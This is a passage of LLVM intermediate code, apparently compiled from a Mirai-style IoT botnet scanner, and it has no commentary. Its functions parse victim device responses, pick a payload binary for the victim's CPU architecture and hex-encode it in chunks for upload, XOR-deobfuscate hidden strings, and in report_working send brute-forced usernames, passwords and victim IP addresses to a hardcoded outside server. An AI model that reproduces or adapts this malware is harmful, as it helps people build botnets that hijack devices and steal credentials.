  %17 = getelementptr inbounds [5 x i8], [5 x i8]* @.str.131, i64 0, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = icmp eq i8 %15, %18
  br i1 %19, label %67, label %71

; <label>:20:                                     ; preds = %71, %67, %9
  %.2 = phi i32 [ %12, %9 ], [ %70, %67 ], [ %.1.1, %71 ]
  %21 = icmp eq i32 %.2, 0
  br i1 %21, label %66, label %22

; <label>:22:                                     ; preds = %20
  %23 = add nsw i32 %.2, 2
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 11
  store i8 %26, i8* %27, align 2
  %28 = add nsw i32 %.2, 15
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i16
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 14
  %34 = icmp eq i8 %31, 65
  %. = select i1 %34, i16 8, i16 %32
  store i16 %., i16* %33, align 2
  %35 = icmp eq i16 %., 0
  br i1 %35, label %66, label %36

; <label>:36:                                     ; preds = %22
  %37 = load i8, i8* %27, align 2
  %38 = icmp eq i8 %37, 0
  br i1 %38, label %66, label %39

; <label>:39:                                     ; preds = %36
  switch i16 %., label %43 [
    i16 40, label %63
    i16 62, label %40
    i16 8, label %41
  ]

; <label>:40:                                     ; preds = %39
  br label %63

; <label>:41:                                     ; preds = %39
  %42 = icmp eq i8 %37, 2
  br i1 %42, label %49, label %43

; <label>:43:                                     ; preds = %39, %41
  %44 = load i16, i16* %33, align 2
  %45 = icmp eq i16 %44, 10
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %43
  %47 = load i8, i8* %27, align 2
  %48 = icmp eq i8 %47, 2
  br i1 %48, label %49, label %thread-pre-split

; <label>:49:                                     ; preds = %46, %41
  store i16 8, i16* %33, align 2
  br label %63

thread-pre-split:                                 ; preds = %46
  %.pr = load i16, i16* %33, align 2
  br label %50

; <label>:50:                                     ; preds = %thread-pre-split, %43
  %51 = phi i16 [ %.pr, %thread-pre-split ], [ %44, %43 ]
  %52 = icmp eq i16 %51, 8
  br i1 %52, label %53, label %56

; <label>:53:                                     ; preds = %50
  %54 = load i8, i8* %27, align 2
  %55 = icmp eq i8 %54, 1
  br i1 %55, label %62, label %56

; <label>:56:                                     ; preds = %53, %50
  %57 = load i16, i16* %33, align 2
  %58 = icmp eq i16 %57, 10
  br i1 %58, label %59, label %63

; <label>:59:                                     ; preds = %56
  %60 = load i8, i8* %27, align 2
  %61 = icmp eq i8 %60, 1
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %59, %53
  store i16 8, i16* %33, align 2
  br label %63

; <label>:63:                                     ; preds = %56, %59, %39, %49, %62, %40
  %.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i64 0, i64 0), %40 ], [ getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0), %49 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i64 0, i64 0), %62 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0), %39 ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0), %59 ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0), %56 ]
  %64 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  %65 = tail call i8* @strcpy(i8* %64, i8* nonnull %.0) #9
  br label %66

; <label>:66:                                     ; preds = %22, %36, %20, %63
  %.035 = phi i32 [ %.2, %63 ], [ 0, %20 ], [ -1, %36 ], [ -1, %22 ]
  ret i32 %.035

; <label>:67:                                     ; preds = %13
  %68 = add nsw i32 %.1, 1
  %69 = icmp eq i32 %68, 4
  %70 = trunc i64 %indvars.iv.next to i32
  br i1 %69, label %20, label %71

; <label>:71:                                     ; preds = %67, %13
  %.1.1 = phi i32 [ %68, %67 ], [ 0, %13 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %72 = icmp slt i64 %indvars.iv.next.1, 8192
  br i1 %72, label %2, label %20
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_arm_subtype(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %3 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8) #9
  call void @table_lock_val(i8 zeroext 12) #9
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %23, label %11

; <label>:11:                                     ; preds = %1
  %12 = add nsw i32 %9, -1
  %13 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i64 0, i64 0), i32 5) #9
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %18

; <label>:15:                                     ; preds = %11
  %16 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i64 0, i64 0), i32 5) #9
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %15, %11
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i64 0, i64 0), i64 5, i32 1, i1 false)
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 14
  store i16 41, i16* %20, align 2
  br label %23

; <label>:21:                                     ; preds = %15
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %22, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %23

; <label>:23:                                     ; preds = %18, %21, %1
  %.0 = phi i32 [ 0, %1 ], [ %9, %21 ], [ %9, %18 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @report_working(i32, %struct.scanner_connection*, i32) unnamed_addr #3 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @fork() #9
  %6 = icmp sgt i32 %5, 0
  %7 = icmp eq i32 %5, -1
  %or.cond = or i1 %6, %7
  br i1 %or.cond, label %8, label %9

; <label>:8:                                      ; preds = %3
  ret void

; <label>:9:                                      ; preds = %3
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  tail call void @exit(i32 0) #10
  unreachable

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = tail call i32 @htonl(i32 -1335130672) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %15, i32* %16, align 4
  %17 = tail call zeroext i16 @htons(i16 zeroext 1293) #11
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %17, i16* %18, align 2
  %19 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %20 = call i32 @connect(i32 %10, %struct.sockaddr* nonnull %19, i32 16) #9
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %24

; <label>:22:                                     ; preds = %13
  %23 = call i32 @close(i32 %10) #9
  call void @exit(i32 0) #10
  unreachable

; <label>:24:                                     ; preds = %13
  %25 = and i32 %0, 255
  %26 = lshr i32 %0, 8
  %27 = and i32 %26, 255
  %28 = lshr i32 %0, 16
  %29 = and i32 %28, 255
  %30 = lshr i32 %0, 24
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 0
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** %31, align 8
  %33 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 0, i32 0
  %34 = load i8*, i8** %33, align 8
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 0, i32 1
  %36 = load i8*, i8** %35, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 8, i64 0
  %38 = icmp eq i32 %2, 1
  %39 = select i1 %38, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.129, i64 0, i64 0)
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 1, i32 1
  %41 = load i32, i32* %40, align 4
  %42 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 9
  %43 = load i8, i8* %42, align 4
  %44 = zext i8 %43 to i32
  %45 = call i32 (i32, i8*, ...) @fdsend(i32 %10, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.127, i64 0, i64 0), i32 %25, i32 %27, i32 %29, i32 %30, i8* %34, i8* %36, i8* %37, i8* %39, i32 %41, i32 %44)
  %46 = call i32 @close(i32 %10) #9
  call void @exit(i32 0) #10
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @connection_consume_upload_methods(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %3 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8) #9
  call void @table_lock_val(i8 zeroext 12) #9
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %21, label %11

; <label>:11:                                     ; preds = %1
  %12 = add nsw i32 %9, -1
  %13 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i64 0, i64 0), i32 10) #9
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %17, label %15

; <label>:15:                                     ; preds = %11
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 1
  store i32 1, i32* %16, align 4
  br label %21

; <label>:17:                                     ; preds = %11
  %18 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.149, i64 0, i64 0), i32 10) #9
  %19 = icmp ne i32 %18, -1
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 1
  %.sink = select i1 %19, i32 2, i32 0
  store i32 %.sink, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %15, %17, %1
  %.0 = phi i32 [ 0, %1 ], [ %9, %17 ], [ %9, %15 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc %struct.payload* @get_retrieve_binary(%struct.scanner_connection* nocapture readonly) unnamed_addr #8 {
  %2 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 14
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 11
  %4 = load i8, i8* %3, align 2
  %5 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 0, i32 0), align 16
  %6 = icmp eq i8 %4, %5
  br i1 %6, label %7, label %13

; <label>:7:                                      ; preds = %1
  %8 = load i16, i16* %2, align 2
  %9 = zext i16 %8 to i32
  %10 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 0, i32 1), align 1
  %11 = zext i8 %10 to i32
  %12 = icmp eq i32 %9, %11
  br i1 %12, label %16, label %13

; <label>:13:                                     ; preds = %7, %1
  %14 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 1, i32 0), align 8
  %15 = icmp eq i8 %4, %14
  br i1 %15, label %17, label %23

; <label>:16:                                     ; preds = %41, %35, %26, %17, %7
  %.012 = phi %struct.payload* [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 0), %7 ], [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 1), %17 ], [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 2), %26 ], [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 3), %35 ], [ null, %41 ]
  ret %struct.payload* %.012

; <label>:17:                                     ; preds = %13
  %18 = load i16, i16* %2, align 2
  %19 = zext i16 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 1, i32 1), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %19, %21
  br i1 %22, label %16, label %23

; <label>:23:                                     ; preds = %17, %13
  %24 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 2, i32 0), align 16
  %25 = icmp eq i8 %4, %24
  br i1 %25, label %26, label %32

; <label>:26:                                     ; preds = %23
  %27 = load i16, i16* %2, align 2
  %28 = zext i16 %27 to i32
  %29 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 2, i32 1), align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %28, %30
  br i1 %31, label %16, label %32

; <label>:32:                                     ; preds = %26, %23
  %33 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 3, i32 0), align 8
  %34 = icmp eq i8 %4, %33
  br i1 %34, label %35, label %41

; <label>:35:                                     ; preds = %32
  %36 = load i16, i16* %2, align 2
  %37 = zext i16 %36 to i32
  %38 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 3, i32 1), align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %37, %39
  br i1 %40, label %16, label %41

; <label>:41:                                     ; preds = %35, %32
  br label %16
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc noalias %struct.binary* @process_retrieve_binary(%struct.payload* nocapture readonly) unnamed_addr #3 {
  %2 = alloca [5 x i8], align 1
  %3 = alloca [256 x i8], align 16
  %4 = getelementptr inbounds [256 x i8], [256 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 256, i32 16, i1 false)
  %5 = getelementptr inbounds %struct.payload, %struct.payload* %0, i64 0, i32 3
  %6 = load i16, i16* %5, align 8
  %div = lshr i16 %6, 6
  %addconv = add nuw nsw i16 %div, 1
  %7 = zext i16 %addconv to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 16) #9
  %9 = bitcast i8* %8 to %struct.binary*
  br label %13

.preheader:                                       ; preds = %13
  %10 = getelementptr inbounds i8, i8* %8, i64 8
  %11 = getelementptr inbounds [5 x i8], [5 x i8]* %2, i64 0, i64 0
  %12 = getelementptr inbounds %struct.payload, %struct.payload* %0, i64 0, i32 2
  br label %19

; <label>:13:                                     ; preds = %1, %13
  %indvars.iv40 = phi i64 [ 0, %1 ], [ %indvars.iv.next41, %13 ]
  %14 = tail call noalias i8* @malloc(i64 256) #9
  %15 = getelementptr inbounds %struct.binary, %struct.binary* %9, i64 %indvars.iv40, i32 0
  store i8* %14, i8** %15, align 8
  %indvars.iv.next41 = add nuw i64 %indvars.iv40, 1
  %16 = load i16, i16* %5, align 8
  %div27 = lshr i16 %16, 6
  %addconv28 = add nuw nsw i16 %div27, 1
  %17 = zext i16 %addconv28 to i64
  %18 = icmp slt i64 %indvars.iv.next41, %17
  br i1 %18, label %13, label %.preheader

; <label>:19:                                     ; preds = %.preheader, %43
  %indvars.iv38 = phi i64 [ 0, %.preheader ], [ %indvars.iv.next39, %43 ]
  %.026 = phi i32 [ 0, %.preheader ], [ %49, %43 ]
  %20 = load i16, i16* %5, align 8
  %21 = icmp eq i16 %20, 0
  br i1 %21, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %19
  %22 = sext i32 %.026 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %27
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %27 ]
  %.in = phi i16 [ %20, %.lr.ph.preheader ], [ %35, %27 ]
  %.132 = phi i32 [ 0, %.lr.ph.preheader ], [ %34, %27 ]
  %23 = add nsw i64 %indvars.iv, %22
  %24 = zext i16 %.in to i64
  %25 = icmp slt i64 %23, %24
  %26 = trunc i64 %indvars.iv to i32
  br i1 %25, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %11, i8 0, i64 5, i32 1, i1 false)
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 %23
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %11, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i64 0, i64 0), i32 %31)
  %33 = call i8* @strcat(i8* nonnull %4, i8* nonnull %11) #9
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %34 = add nuw nsw i32 %.132, 1
  %35 = load i16, i16* %5, align 8
  %36 = zext i16 %35 to i64
  %37 = icmp sge i64 %indvars.iv.next, %36
  %38 = icmp eq i64 %indvars.iv.next, 64
  %or.cond = or i1 %38, %37
  br i1 %or.cond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph, %27
  %.1.lcssa.ph = phi i32 [ %26, %.lr.ph ], [ %34, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %19
  %.1.lcssa = phi i32 [ 0, %19 ], [ %.1.lcssa.ph, %._crit_edge.loopexit ]
  %39 = load i16, i16* %5, align 8
  %div29 = lshr i16 %39, 6
  %addconv30 = add nuw nsw i16 %div29, 1
  %40 = zext i16 %addconv30 to i64
  %41 = icmp eq i64 %indvars.iv38, %40
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %._crit_edge
  ret %struct.binary* %9

; <label>:43:                                     ; preds = %._crit_edge
  %44 = getelementptr inbounds %struct.binary, %struct.binary* %9, i64 %indvars.iv38, i32 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @util_strlen(i8* nonnull %4) #9
  %47 = sext i32 %46 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %45, i8* nonnull %4, i64 %47, i32 1, i1 false)
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 256, i32 16, i1 false)
  %48 = trunc i64 %indvars.iv38 to i8
  store i8 %48, i8* %10, align 8
  %indvars.iv.next39 = add nuw i64 %indvars.iv38, 1
  %49 = add nsw i32 %.1.lcssa, %.026
  br label %19
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_method_resonse(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %5 = load i32, i32* %4, align 8
  %6 = tail call i32 @util_memsearch(i8* %3, i32 %5, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.150, i64 0, i64 0), i32 20) #9
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %8, label %19

; <label>:8:                                      ; preds = %1
  %9 = load i32, i32* %4, align 8
  %10 = tail call i32 @util_memsearch(i8* %3, i32 %9, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i64 0, i64 0), i32 16) #9
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %19

; <label>:12:                                     ; preds = %8
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %13 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %14 = load i32, i32* %4, align 8
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, -1
  %17 = call i32 @util_memsearch(i8* nonnull %3, i32 %14, i8* %13, i32 %16) #9
  call void @table_lock_val(i8 zeroext 12) #9
  %18 = icmp eq i32 %17, -1
  %. = select i1 %18, i32 0, i32 %17
  br label %19

; <label>:19:                                     ; preds = %12, %8, %1
  %.0 = phi i32 [ -2, %1 ], [ -1, %8 ], [ %., %12 ]
  ret i32 %.0
}

declare i32 @util_memsearch(i8*, i32, i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3 {
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast [1 x %struct.__va_list_tag]* %3 to i8*
  call void @llvm.va_start(i8* nonnull %5)
  %6 = call i32 @vsprintf(i8* %0, i8* %1, %struct.__va_list_tag* nonnull %4) #9
  call void @llvm.va_end(i8* nonnull %5)
  ret i32 undef
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #9

; Function Attrs: nounwind
declare i32 @vsprintf(i8* nocapture, i8* nocapture readonly, %struct.__va_list_tag*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #9

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc signext i8 @can_consume(%struct.scanner_connection* readonly, i8* readnone, i32) unnamed_addr #8 {
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %5 = load i32, i32* %4, align 8
  %6 = sext i32 %5 to i64
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %6
  %8 = sext i32 %2 to i64
  %9 = getelementptr inbounds i8, i8* %1, i64 %8
  %10 = icmp ult i8* %9, %7
  %11 = zext i1 %10 to i8
  ret i8 %11
}

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc i8* @deobf(i8*, i32* nocapture) unnamed_addr #3 {
  %3 = tail call i32 @util_strlen(i8* %0) #9
  store i32 %3, i32* %1, align 4
  %4 = add nsw i32 %3, 1
  %5 = sext i32 %4 to i64
  %6 = tail call noalias i8* @malloc(i64 %5) #9
  tail call void @util_memcpy(i8* %6, i8* %0, i32 %4) #9
  %7 = load i32, i32* %1, align 4
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %2
  %9 = load i32, i32* %1, align 4
  %10 = sext i32 %9 to i64
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = getelementptr inbounds i8, i8* %6, i64 %indvars.iv
  %13 = load i8, i8* %12, align 1
  %14 = xor i8 %13, 34
  store i8 %14, i8* %12, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %15 = icmp slt i64 %indvars.iv.next, %10
  br i1 %15, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret i8* %6
}

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @scanner_kill() local_unnamed_addr #3 {
  %1 = load i32, i32* @scanner_pid, align 4
  %2 = tail call i32 @kill(i32 %1, i32 9) #9
  ret void
}

attributes #0 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind }
attributes #10 = { noreturn nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { nounwind readonly }

!llvm.ident = !{!0, !0}

